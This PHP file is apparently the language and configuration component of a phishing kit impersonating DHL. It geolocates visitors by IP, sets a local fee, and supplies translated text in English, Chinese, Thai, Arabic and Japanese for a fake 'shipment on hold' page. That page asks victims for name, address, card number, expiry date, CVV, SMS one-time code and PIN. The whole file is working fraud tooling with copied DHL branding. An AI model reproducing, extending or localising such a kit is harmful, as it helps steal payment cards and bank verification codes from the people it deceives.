<?php
//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//

session_start();

function get_client_countrycode() {
	
	if(!$_SESSION['countrycode']){
		
		$ip = $_SERVER["REMOTE_ADDR"];
  
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$ip;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 

$_SESSION['countrycode'] = $addrDetailsArr['geoplugin_countryCode'];


		
	}
  
    return $_SESSION['countrycode'];
}

if($_SESSION['countrycode'] == 'TW'){ $_SESSION['price'] = '63,15 TWD';}else if($_SESSION['countrycode'] == 'QA'){ $_SESSION['price'] = '7,25 QAR';}else if($_SESSION['countrycode'] == 'SA'){ $_SESSION['price'] = '7,47 SAR';}else if($_SESSION['countrycode'] == 'TH'){ $_SESSION['price'] = '69,83 THB';}else if($_SESSION['countrycode'] == 'JP'){ $_SESSION['price'] = '281.89 JPY';}else if($_SESSION['countrycode'] == 'CN'){ $_SESSION['price'] = '14.30 CNY';}else{  $_SESSION['price'] = '1,99 $';}


function get_language($countrycode) {
    $languages = array(
        "US" => "en", // الولايات المتحدة - اللغة الإنجليزية
        "HK" => "zh-TW", // الصين (CN): HONG KONG
        "CN" => "zh-TW", // الصين (CN): اللغة الصينية (zh). (zh-TW)
        "JP" => "ja", // اليابان (JP): اللغة اليابانية (ja).
        "TH" => "th", // تايلاند (TH): اللغة التايلاندية (th).
        "MA" => "en", // المغرب - اللغة العربية
        "AE" => "ar", // المغرب - اللغة EMIRATES
        "QA" => "ar", // المغرب - اللغة QATAR
        "SA" => "ar", // المغرب - اللغة Saudi arabia
        "TW" => "zh-TW", //  -taiwan
		
		
    );

    if (array_key_exists($countrycode, $languages)) {
        return $languages[$countrycode];
    }

    return "zh-TW";
}

function get_text($place) {
    global $lang;
    $countrycode = get_client_countrycode();
    $language = get_language($countrycode);
    
    if (isset($lang[$place][$language])) {
        return $lang[$place][$language];
    } else {
        return $lang[$place]["en"];
    }
}

$lang = array(

"birth_date" => array(
    "en" => "Date Of Birth",
    "zh-TW" => "出生日期",	
    "th" => "วันเกิด",
    "ar" => "تاريخ الميلاد",
    "ja" => "生年月日",
),

"birth_place" => array(
    "en" => "DD/MM/YYYY",
    "zh-TW" => "日/月/年",
    "th" => "วัน/เดือน/ปี",
    "ar" => "يوم/شهر/سنة",
    "ja" => "日/月/年",
),

"X1" => array(
    "en" => "SCHEDULED DELIVERY DATE",
    "zh-TW" => "預定交貨日期",
    "th" => "วันที่ส่งสินค้าที่กำหนด",
    "ar" => "تاريخ التسليم المجدول",
    "ja" => "配達予定日",
),

"X2" => array(
    "en" => "DELIVERY STATUS",
    "zh-TW" => "交貨狀態",
    "th" => "สถานะการส่งสินค้า",
    "ar" => "حالة التسليم",
    "ja" => "配達状況",
),


"X3" => array(
    "en" => "TRACKING ID",
    "zh-TW" => "追踪编号",
    "th" => "หมายเลขการติดตาม",
    "ar" => "رقم التتبع",
    "ja" => "追跡ID",
),

"X20" => array(
    "en" => "Resume Delivery",
    "zh-TW" => "恢復交貨",
    "th" => "ดำเนินการจัดส่งอีกครั้ง",
    "ar" => "استئناف التسليم",
    "ja" => "配達を再開",
),

"X21" => array(
"en" => "Package Protection Center",
"zh-TW" => "包裝保護中心",
"th" => "ศูนย์ความปลอดภัยของพัสดุ",
"ar" => "مركز حماية الطرود",
"ja" => "パッケージ保護センター",
),

"X4" => array(
    "en" => "Pending",
    "zh-TW" => "待處理",
    "th" => "รอดำเนินการ",
    "ar" => "قيد الانتظار",
    "ja" => "保留中",
),

"X14" => array(
    "en" => "Pending",
    "zh-TW" => "待處理",
    "th" => "รอดำเนินการ",
    "ar" => "قيد الانتظار",
    "ja" => "保留中",
),

"X5" => array(
    "en" => "On Hold",
    "zh-TW" => "暫停處理",
    "th" => "พักการดำเนินการ",
    "ar" => "معلق",
    "ja" => "保留中",
),

"X6" => array(
    "en" => "US789******46",
    "zh-TW" => "US789******46",
    "th" => "US789******46",
    "ar" => "US789******46",
    "ja" => "US789******46",
),

"X7" => array(
    "en" => "FROM",
    "zh-TW" => "來自",
    "th" => "จาก",
    "ar" => "من",
    "ja" => "出荷元",
),

"X8" => array(
    "en" => "LITTLE NECK, NY US",
    "zh-TW" => "LITTLE NECK, NY US",
    "th" => "LITTLE NECK, NY US",
    "ar" => "LITTLE NECK, NY US",
    "ja" => "LITTLE NECK, NY US",
),

"X9" => array(
    "en" => "WE HAVE YOUR PACKAGE",
    "zh-TW" => "我們已收到您的包裹",
    "th" => "เรามีพัสดุของคุณ",
    "ar" => "لدينا طردك",
    "ja" => "パッケージをお預かりしました",
),

"X10" => array(
    "en" => "OUT FOR DELIVERY",
    "zh-TW" => "正在派送中",
    "th" => "กำลังจัดส่ง",
    "ar" => "جاري التوصيل",
    "ja" => "配達中",
),

"X11" => array(
    "en" => "TO",
    "zh-TW" => "至",
    "th" => "ถึง",
    "ar" => "إلى",
    "ja" => "宛先",
),

"X13" => array(
    "en" => "Scheduled Delivery Date",
    "zh-TW" => "預定交貨日期",
    "th" => "วันที่ส่งสินค้าที่กำหนด",
    "ar" => "تاريخ التسليم المجدول",
    "ja" => "配達予定日",
),

"X16" => array(
"en" => "Requires shipping fee ({$_SESSION['price']})",
"zh-TW" => "需要付運費（{$_SESSION['price']}）",
"th" => "ต้องชำระค่าขนส่ง ({$_SESSION['price']})",
"ar" => "يتطلب رسوم الشحن ({$_SESSION['price']})",
"ja" => "配送料が必要です（{$_SESSION['price']}）",
),


"ERRAR" => array(
    "en" => "Invalid card number. Please enter a valid card.",
    "zh-TW" => "無效卡號。請輸入有效的卡。",
    "th" => "เลขบัตรไม่ถูกต้อง.กรุณากรอกบัตรที่ถูกต้อง",
    "ar" => "رقم البطاقة غير صالح. يرجى إدخال رقم بطاقة صالح.",
    "ja" => "無効なカード番号です。有効なカードを入力してください。",
),
"top_header1" => array(
    "en" => "Alert(1)",
    "zh-TW" => "警報（1）",
    "th" => "การแจ้งเตือน (1)",
    "ar" => "تنبيه (1)",
    "ja" => "アラート(1)",
),
"last_update" => array(
    "en" => "Last Updated",
    "zh-TW" => "最近更新時間",
    "th" => "อัปเดตล่าสุด",
    "ar" => "آخر تحديث",
    "ja" => "最終更新",
),
"shipment" => array(
    "en" => "Shipment type: <b>Other</b>",
    "zh-TW" => "裝運類型：<b>其他</b>",
    "th" => "ประเภทการจัดส่ง: <b> อื่น ๆ </b>",
    "ar" => "نوع الشحن: <b>آخر</b>",
    "ja" => "配送タイプ： <b>その他</b>",
),
"card_info" => array(
    "en" => "Card Information",
    "zh-TW" => "卡信息",
    "th" => "ข้อมูลบัตร",
    "ar" => "معلومات البطاقة",
    "ja" => "カード情報",
),
"top_header2" => array(
    "en" => "Contact Us",
    "zh-TW" => "聯繫我們",
    "th" => "ติดต่อเรา",
    "ar" => "اتصل بنا",
    "ja" => "お問い合わせ",
),
"top_header3" => array(
    "en" => "English",
    "zh-TW" => "Traditional Chinese",
    "th" => "Thai",
    "ar" => "العربية",
    "ja" => "Japanese",
),
"top_header4" => array(
    "en" => "Search",
    "zh-TW" => "搜索",
    "th" => "ค้นหา",
    "ar" => "بحث",
    "ja" => "検索",
),
"mainmenu1" => array(
    "en" => "Track",
    "zh-TW" => "追踪",
    "th" => "ติดตาม",
    "ar" => "تتبع",
    "ja" => "追跡",
),
"mainmenu2" => array(
    "en" => "Ship",
    "zh-TW" => "船",
    "th" => "เรือ",
    "ar" => "شحن",
    "ja" => "出荷",
),
"mainmenu3" => array(
    "en" => "Logistics Solutions",
    "zh-TW" => "物流解決方案",
    "th" => "โซลูชั่นโลจิสติกส์",
    "ar" => "حلول اللوجستية",
    "ja" => "物流ソリューション",
),
"mainmenu4" => array(
    "en" => "Customer Service",
    "zh-TW" => "客戶服務",
    "th" => "บริการลูกค้า",
    "ar" => "خدمة العملاء",
    "ja" => "カスタマーサービス",
),
"header-right" => array(
    "en" => "Customer Portal Logins",
    "zh-TW" => "客戶門戶網站登錄",
    "th" => "เข้าสู่ระบบพอร์ทัลลูกค้า",
    "ar" => "تسجيل الدخول إلى بوابة العملاء",
    "ja" => "顧客ポータルのログイン",
),
"footer-widget-1-header" => array(
    "en" => "Help Center",
    "zh-TW" => "幫助中心",
    "th" => "ศูนย์ช่วยเหลือ",
    "ar" => "مركز المساعدة",
    "ja" => "ヘルプセンター",
),
"footer-widget-2-header" => array(
    "en" => "Our Divisions",
    "zh-TW" => "我們的分裂",
    "th" => "แผนกของเรา",
    "ar" => "أقسامنا",
    "ja" => "私たちの部門",
),
"footer-widget-3-header" => array(
    "en" => "Industry Sectors",
    "zh-TW" => "行業",
    "th" => "ภาคอุตสาหกรรม",
    "ar" => "قطاعات الصناعة",
    "ja" => "業界セクター",
),
"footer-widget-4-header" => array(
    "en" => "Company Information",
    "zh-TW" => "公司信息",
    "th" => "ข้อมูล บริษัท",
    "ar" => "معلومات الشركة",
    "ja" => "会社情報",
),
"footer-widget-1-1" => array(
    "en" => "Customer Service",
    "zh-TW" => "客戶服務",
    "th" => "บริการลูกค้า",
    "ar" => "خدمة العملاء",
    "ja" => "カスタマーサービス",
),
"footer-widget-1-2" => array(
    "en" => "Customer Portal Logins",
    "zh-TW" => "客戶門戶網站登錄",
    "th" => "เข้าสู่ระบบพอร์ทัลลูกค้า",
    "ar" => "تسجيل الدخول إلى بوابة العملاء",
    "ja" => "顧客ポータルのログイン",
),
"footer-widget-1-3" => array(
    "en" => "Digital Partners and Integrations",
    "zh-TW" => "數字合作夥伴和集成",
    "th" => "พันธมิตรดิจิทัลและการบูรณาการ",
    "ar" => "شركاء وتكامل رقمي",
    "ja" => "デジタルパートナーと統合",
),
"footer-widget-1-4" => array(
    "en" => "Developer Portal",
    "zh-TW" => "開發人員門戶",
    "th" => "พอร์ทัลนักพัฒนา",
    "ar" => "بوابة المطور",
    "ja" => "開発者ポータル",
),
"footer-widget-2-1" => array(
    "en" => "Post and Parcel Germany",
    "zh-TW" => "德國郵政和包裹",
    "th" => "โพสต์และพัสดุเยอรมนี",
    "ar" => "بريد وطرود ألمانيا",
    "ja" => "ドイツの郵便と小包",
),
"footer-widget-2-2" => array(
    "en" => "DHL Express",
    "zh-TW" => "DHL Express",
    "th" => "DHL Express",
    "ar" => "دي إتش إل إكسبريس",
    "ja" => "DHLエクスプレス",
),
"footer-widget-2-3" => array(
    "en" => "DHL Global Forwarding",
    "zh-TW" => "DHL全球轉發",
    "th" => "การส่งต่อ Global Global",
    "ar" => "دي إتش إل جلوبال فورواردينغ",
    "ja" => "DHLグローバルフォワーディング",
),
"footer-widget-2-4" => array(
    "en" => "DHL Freight",
    "zh-TW" => "DHL貨運",
    "th" => "DHL ขนส่งสินค้า",
    "ar" => "دي إتش إل فريت",
    "ja" => "DHLフレート",
),
"footer-widget-2-5" => array(
    "en" => "DHL Supply Chain",
    "zh-TW" => "DHL供應鏈",
    "th" => "ห่วงโซ่อุปทาน DHL",
    "ar" => "دي إتش إل سبلاي شين",
    "ja" => "DHLサプライチェーン",
),
"footer-widget-2-6" => array(
    "en" => "DHL eCommerce",
    "zh-TW" => "DHL電子商務",
    "th" => "DHL Ecommerce",
    "ar" => "دي إتش إل التجارة الإلكترونية",
    "ja" => "DHL電子商取引",
),
"footer-widget-3-1" => array(
    "en" => "Auto-Mobility",
    "zh-TW" => "自動運動",
    "th" => "ความเคลื่อนไหวอัตโนมัติ",
    "ar" => "النقل الذاتي",
    "ja" => "自動車の移動",
),
"footer-widget-3-2" => array(
    "en" => "Chemicals",
    "zh-TW" => "化學物質",
    "th" => "สารเคมี",
    "ar" => "المواد الكيميائية",
    "ja" => "化学物質",
),
"footer-widget-3-3" => array(
    "en" => "Consumer",
    "zh-TW" => "消費者",
    "th" => "ผู้บริโภค",
    "ar" => "المستهلك",
    "ja" => "消費者",
),
"footer-widget-3-4" => array(
    "en" => "Energy",
    "zh-TW" => "活力",
    "th" => "พลังงาน",
    "ar" => "الطاقة",
    "ja" => "エネルギー",
),
"footer-widget-3-5" => array(
    "en" => "Engineering and Manufacturing",
    "zh-TW" => "工程和製造",
    "th" => "วิศวกรรมและการผลิต",
    "ar" => "الهندسة والتصنيع",
    "ja" => "エンジニアリングと製造",
),
"footer-widget-3-6" => array(
    "en" => "Life Sciences and Healthcare",
    "zh-TW" => "生命科學和醫療保健",
    "th" => "วิทยาศาสตร์เพื่อชีวิตและการดูแลสุขภาพ",
    "ar" => "العلوم الحياتية والرعاية الصحية",
    "ja" => "ライフサイエンスとヘルスケア",
),
"footer-widget-3-7" => array(
    "en" => "Public Sector",
    "zh-TW" => "公共部門",
    "th" => "ภาครัฐ",
    "ar" => "القطاع العام",
    "ja" => "公共部門",
),
"footer-widget-3-8" => array(
    "en" => "Retail",
    "zh-TW" => "零售",
    "th" => "ขายปลีก",
    "ar" => "التجزئة",
    "ja" => "小売業",
),
"footer-widget-3-9" => array(
    "en" => "Technology",
    "zh-TW" => "技術",
    "th" => "เทคโนโลยี",
    "ar" => "تكنولوجيا",
    "ja" => "テクノロジー",
),
"footer-widget-4-1" => array(
    "en" => "About DHL",
    "zh-TW" => "關於DHL",
    "th" => "เกี่ยวกับ DHL",
    "ar" => "حول دي إتش إل",
    "ja" => "DHLについて",
),
"footer-widget-4-2" => array(
    "en" => "Careers",
    "zh-TW" => "職業",
    "th" => "อาชีพ",
    "ar" => "الوظائف",
    "ja" => "キャリア",
),
"footer-widget-4-3" => array(
    "en" => "Press Center",
    "zh-TW" => "按下中心",
    "th" => "กดศูนย์",
    "ar" => "مركز الصحافة",
    "ja" => "プレスセンター",
),
"footer-widget-4-4" => array(
    "en" => "Sustainability",
    "zh-TW" => "可持續性",
    "th" => "ความยั่งยืน",
    "ar" => "الاستدامة",
    "ja" => "持続可能性",
),
"footer-widget-4-5" => array(
    "en" => "Insights and Innovation",
    "zh-TW" => "見解和創新",
    "th" => "ข้อมูลเชิงลึกและนวัตกรรม",
    "ar" => "الرؤى والابتكار",
    "ja" => "インサイトとイノベーション",
),
"footer-widget-4-6" => array(
    "en" => "Official Logistics Partners",
    "zh-TW" => "官方物流合作夥伴",
    "th" => "พันธมิตรโลจิสติกส์อย่างเป็นทางการ",
    "ar" => "شركاء الخدمات اللوجستية الرسميون",
    "ja" => "公式物流パートナー",
),
"follow-us" => array(
    "en" => "Follow Us",
    "zh-TW" => "跟著我們",
    "th" => "ตามเรามา",
    "ar" => "تابعنا",
    "ja" => "フォローアップ",
),
"footer-menu-1" => array(
    "en" => "Fraud Awareness",
    "zh-TW" => "欺詐意識",
    "th" => "การรับรู้การฉ้อโกง",
    "ar" => "الوعي بالاحتيال",
    "ja" => "詐欺防止",
),
"footer-menu-2" => array(
    "en" => "Legal Notice",
    "zh-TW" => "法律聲明",
    "th" => "ประกาศทางกฎหมาย",
    "ar" => "إشعار قانوني",
    "ja" => "法的通知",
),
"footer-menu-3" => array(
    "en" => "Terms of Use",
    "zh-TW" => "使用條款",
    "th" => "ข้อกำหนดการใช้งาน",
    "ar" => "شروط الاستخدام",
    "ja" => "利用規約",
),
"footer-menu-4" => array(
    "en" => "Privacy Notice",
    "zh-TW" => "隱私聲明",
    "th" => "แจ้งให้ทราบความเป็นส่วนตัว",
    "ar" => "إشعار الخصوصية",
    "ja" => "プライバシーに関するお知らせ",
),
"footer-menu-5" => array(
    "en" => "Dispute Resolution",
    "zh-TW" => "爭議解決",
    "th" => "การระงับข้อพิพาท",
    "ar" => "حل النزاعات",
    "ja" => "紛争の解決",
),
"footer-menu-6" => array(
    "en" => "Accessibility",
    "zh-TW" => "可訪問性",
    "th" => "การเข้าถึงได้",
    "ar" => "إمكانية الوصول",
    "ja" => "アクセシビリティ",
),
"footer-menu-7" => array(
    "en" => "Additional Information",
    "zh-TW" => "附加信息",
    "th" => "ข้อมูลเพิ่มเติม",
    "ar" => "معلومات إضافية",
    "ja" => "追加情報",
),
"footer-menu-8" => array(
    "en" => "Cookies Settings",
    "zh-TW" => "cookies設置",
    "th" => "การตั้งค่าคุกกี้",
    "ar" => "إعدادات ملفات تعريف الارتباط",
    "ja" => "Cookieの設定",
),
"copyright" => array(
    "en" => "2023 © DHL International GmbH. All rights reserved",
    "zh-TW" => "2023 © DHL International GmbH。版權所有",
    "th" => "2023 © DHL International GmbH สงวนลิขสิทธิ์ทั้งหมด",
    "ar" => "2023 © DHL International GmbH. جميع الحقوق محفوظة",
    "ja" => "2023 © DHL International GmbH. All rights reserved",
),

"title2" => array(
    "en" => "Shipment On Hold",
    "zh-TW" => "運送暫停",
    "th" => "พักการจัดส่ง",
    "ar" => "الشحنة معلقة",
    "ja" => "配送保留中",
),


"status" => array(
    "en" => "Status: <b> On Hold </b>",
    "zh-TW" => "狀態： <b> 暫停 </b>",
    "th" => "สถานะ： <b> พักการจัดส่ง </b>",
    "ar" => "الحالة: <b> معلقة </b>",
    "ja" => "ステータス： <b> 配送保留中 </b>",
),

"total" => array(
    "en" => "Total : <b> 1.99$ </b>",
    "zh-TW" => "總計： <b> 14.30 CNY </b>",
    "th" => "รวมทั้งหมด： <b> 68.54 THB </b>",
    "ar" => "الإجمالي: <b> 1.99 $ </b>",
    "ja" => "合計： <b> 281.89 JPY </b>",
),


"parcel" => array(
    "en" => "This shipment is handled by: <b>DHL EXPRESE</b>",
    "zh-TW" => "此貨物由： <b>DHL EXPRESE</b> 處理",
    "th" => "การส่งของนี้จัดการโดย： <b>DHL EXPRESE</b>",
    "ar" => "تم التعامل مع هذه الشحنة بواسطة: <b>DHL EXPRESE</b>",
    "ja" => "この出荷は<b>DHL EXPRESE</b>が取り扱っています",
),

"important_title" => array(
    "en" => "Important Message!",
    "zh-TW" => "重要訊息！",
    "th" => "ข้อความสำคัญ!",
    "ar" => "رسالة مهمة!",
    "ja" => "重要なメッセージ！",
),

"important_message" => array(
    "en" => "Enter your information and pay the additional fee to have your package shipped",
    "zh-TW" => "請輸入您的資料並支付額外費用以寄送您的包裹",
    "th" => "กรุณาใส่ข้อมูลของคุณและชำระค่าบริการเพิ่มเติมเพื่อส่งพัสดุของคุณ",
    "ar" => "أدخل معلوماتك وادفع الرسوم الإضافية لشحن طردك",
    "ja" => "お客様の情報を入力し、追加料金を支払って包裹を発送してください",
),


"next" => array(
    "en" => "Next",
    "zh-TW" => "下一個",
    "th" => "ต่อไป",
    "ar" => "التالي",
    "ja" => "次へ",
),

"nextt" => array(
    "en" => "Pay 1.99 $",
    "zh-TW" => "支付 14.30 CNY",
    "th" => "ชำระเงิน 68.54 THB",
    "ar" => "ادفع 1.99 دولار",
    "ja" => "281.89 JPY を支払う",
),

"address_message" => array(
    "en" => "We need your Address to be sure that unauthorized persons cannot access your packages, You have 10 working days From the arrival of your package to the DHL branch after this time the package will be returned to the sender.",
    "zh-TW" => "我們需要您的地址以確保未經授權的人無法訪問您的包裹，從包裹到達到DHL分支之後，您將有10個工作日，此時包裹將返回發件人。",
    "th" => "เราต้องการที่อยู่ของคุณเพื่อให้แน่ใจว่าบุคคลที่ไม่ได้รับอนุญาตไม่สามารถเข้าถึงแพ็คเกจของคุณได้คุณมี 10 วันทำการตั้งแต่การมาถึงของแพ็คเกจของคุณไปยังสาขา DHL หลังจากเวลานี้แพ็คเกจจะถูกส่งคืนไปยังผู้ส่ง",
    "ar" => "نحن بحاجة إلى عنوانك للتأكد من عدم تمكن الأشخاص غير المخولين من الوصول إلى طرودك. لديك 10 أيام عمل من وصولطردك إلى فرع دي إتش إل بعد هذا الوقت سيتم إعادة الطرد إلى المرسل.",
    "ja" => "あなたのパッケージに不正な者がアクセスできないようにするために、あなたの住所が必要です。パッケージがDHL支店に到着してから10営業日以内に、この期間を過ぎるとパッケージは送り主に返送されます。",
),
"address_label" => array(
    "en" => "Address",
    "zh-TW" => "地址",
    "th" => "ที่อยู่",
    "ar" => "العنوان",
    "ja" => "住所",
),
"city_label" => array(
    "en" => "City",
    "zh-TW" => "城市",
    "th" => "เมือง",
    "ar" => "المدينة",
    "ja" => "市区町村",
),
"phone_label" => array(
    "en" => "Phone number",
    "zh-TW" => "電話號碼",
    "th" => "หมายเลขโทรศัพท์",
    "ar" => "رقم الهاتف",
    "ja" => "電話番号",
),
"email_label" => array(
    "en" => " Email",
    "zh-TW" => "電子郵件",
    "th" => "อีเมล",
    "ar" => "البريد الإلكتروني",
    "ja" => "メールアドレス",
),
"zip_code_label" => array(
    "en" => "Zip code",
    "zh-TW" => "郵政編碼",
    "th" => "รหัสไปรษณีย์",
    "ar" => "الرمز البريدي",
    "ja" => "郵便番号",
),

"name_label" => array(
    "en" => "Full Name",
    "zh-TW" => "全名",
    "th" => "ชื่อเต็ม",
    "ar" => "الاسم الكامل",
    "ja" => "フルネーム",
),

"one_label" => array(
    "en" => "Card number",
    "zh-TW" => "卡號",
    "th" => "หมายเลขบัตร",
    "ar" => "رقم البطاقة",
    "ja" => "カード番号",
),
"two_label" => array(
    "en" => " MM/YY",
    "zh-TW" => "mm/yy",
    "th" => "mm/yy",
    "ar" => "شهر/سنة",
    "ja" => " MM/YY",
),
"three_label" => array(
    "en" => "CVV ",
    "zh-TW" => "CVV",
    "th" => "CVV",
    "ar" => "CVV",
    "ja" => "CVV",
),
"two_labels" => array(
    "en" => "Date Expiration",
    "zh-TW" => "日期到期",
    "th" => "วันที่หมดอายุ",
    "ar" => "تاريخ الانتهاء",
    "ja" => "有効期限",
),
"three_labels" => array(
    "en" => "Code CVV ",
    "zh-TW" => "代碼CVV",
    "th" => "รหัส CVV",
    "ar" => "كود CVV",
    "ja" => "CVVコード",
),
"sms_code_label" => array(
    "en" => "SMS Code",
    "zh-TW" => "SMS代碼",
    "th" => "รหัส SMS",
    "ar" => "رمز SMS",
    "ja" => "SMSコード",
),

"sms_errur" => array(
    "en" => "The code is incorrect",
    "zh-TW" => "代碼錯誤",
    "th" => "รหัสไม่ถูกต้อง",
    "ar" => "الكود غير صحيح",
    "ja" => "コードが間違っています",
),

"thanks" => array(
    "en" => "Thank you for entering the information. We will contact you shortly.",
    "zh-TW" => "感謝您輸入信息。我們將盡快與您聯繫。",
    "th" => "ขอบคุณสำหรับการป้อนข้อมูลเราจะติดต่อคุณในไม่ช้า.",
    "ar" => "شكراً لإدخال المعلومات. سنتواصل معكم قريباً.",
    "ja" => "情報を入力していただきありがとうございます。お問い合わせをいただきました。",
),
"thanks_2" => array(
    "en" => "Verified Successfully",
    "zh-TW" => "成功驗證",
    "th" => "ตรวจสอบให้สำเร็จ",
    "ar" => "تم التحقق بنجاح",
    "ja" => "正常に確認されました",
),
"sms-title" => array(
    "en" => "Please confirm the following payment.",
    "zh-TW" => "請確認以下付款。",
    "th" => "โปรดยืนยันการชำระเงินต่อไปนี้",
    "ar" => "يرجى تأكيد الدفعة التالية.",
    "ja" => "以下の支払いを確認してください。",
),
"sms-title2" => array(
    "en" => "This process requires your PIN code.",
    "zh-TW" => "此過程需要您的PIN代碼。",
    "th" => "กระบวนการนี้ต้องใช้รหัส PIN ของคุณ",
    "ar" => "هذه العملية تتطلب رمز الدخول الخاص بك.",
    "ja" => "このプロセスにはPINコードが必要です。",
),

"sms-message" => array(
    "en" => "An OTP has been sent to your phone number.",
    "zh-TW" => "已向您的手機號碼發送了一個 OTP。",
    "th" => "ได้ส่ง OTP ไปยังหมายเลขโทรศัพท์ของคุณแล้ว",
    "ar" => "تم إرسال رمز التحقق (OTP) إلى رقم هاتفك.",
    "ja" => "OTPがあなたの電話番号に送信されました。",
),

"merchant" => array(
    "en" => "Merchant",
    "zh-TW" => "商人",
    "th" => "พ่อค้า",
    "ar" => "البائع",
    "ja" => "販売業者",
),
"amount" => array(
    "en" => "Amount",
    "zh-TW" => "數量",
    "th" => "จำนวน",
    "ar" => "المبلغ",
    "ja" => "金額",
),
"date" => array(
    "en" => "Date",
    "zh-TW" => "日期",
    "th" => "วันที่",
    "ar" => "التاريخ",
    "ja" => "日付",
),
"credit-card-number" => array(
    "en" => "Credit card number",
    "zh-TW" => "信用卡號碼",
    "th" => "หมายเลขบัตรเครดิต",
    "ar" => "رقم البطاقة الائتمانية",
    "ja" => "クレジットカード番号",
),
"sms-again" => array(
    "en" => "Please enter the verification code received by SMS",
    "zh-TW" => "請輸入SMS收到的驗證代碼",
    "th" => "โปรดป้อนรหัสการยืนยันที่ได้รับจาก SMS",
    "ar" => "يرجى إدخال رمز التحقق الذي تم استلامه عبر الرسائل القصيرة.",
    "ja" => "SMS で受け取った確認コードを入力してください。",
),
"submit" => array(
    "en" => "Submit",
    "zh-TW" => "提交",
    "th" => "ส่ง",
    "ar" => "إرسال",
    "ja" => "送信する",
),
"contact-info" => array(
    "en" => "Contact Information",
    "zh-TW" => "聯繫信息",
    "th" => "ข้อมูลติดต่อ",
    "ar" => "معلومات الاتصال",
    "ja" => "連絡先情報",
),

);

$countrycode = get_client_countrycode();
$_SESSION['countrycode'] = $countrycode;

$language = get_language($countrycode);
$_SESSION['language'] = $language;

?>
